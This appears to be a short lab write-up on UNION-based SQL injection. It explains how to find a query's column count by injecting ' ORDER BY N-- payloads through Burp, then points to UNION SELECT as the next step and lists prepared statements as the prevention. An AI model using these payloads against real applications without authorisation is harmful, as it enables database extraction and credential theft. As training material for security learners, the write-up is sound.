# 🧪 Lab: SQL Injection UNION Attack - Column Count

## 🎯 Goal
Determine number of columns in the original query.

## 🔍 Vulnerability Type
UNION-based SQL Injection

## ⚙️ Payloads Used
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

## 🧠 Explanation
ORDER BY is used to identify number of columns.

If ORDER BY N works → column exists  
If it fails → limit exceeded

Example:
- ORDER BY 1 → works
- ORDER BY 2 → works
- ORDER BY 3 → error

👉 So total columns = 2

## 💥 Exploitation Steps
1. Intercept request in Burp
2. Inject:
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
3. Observe where error occurs
4. Determine column count

## 🔁 Next Step
Once column count is known, use UNION SELECT

## 🌍 Real-World Impact
- Enables database data extraction
- Leads to credential dumping

## 🛡️ Prevention
- Prepared statements
- Avoid dynamic query building
